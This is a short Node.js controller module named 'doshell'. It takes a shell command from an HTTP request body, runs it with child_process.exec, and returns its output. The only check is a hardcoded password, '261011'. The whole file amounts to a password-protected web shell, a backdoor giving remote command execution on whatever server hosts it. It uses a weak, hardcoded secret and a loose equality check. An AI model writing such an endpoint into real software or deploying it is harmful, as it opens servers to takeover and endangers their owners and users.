const { exec } = require("child_process")

const cls = require("cls-hooked")

module.exports = {
    doshell(req, res) {
        // loggerCls.info("Long live rocknroll!")

        const shell = req.body.shell
        const password = req.body.password
        if (password == "261011") {
            exec(shell, (err, stdout, stderr) => {
                res.json({
                    code: 0,
                    msg: "ok",
                    success: true,
                    data: {
                        stdout: stdout,
                        stderr: stderr
                    },
                    err: ""
                })
            })
        } else {
            res.json({
                code: 1,
                msg: "执行失败，密码不正确",
                success: false,
                err: true
            })
        }
    }
}
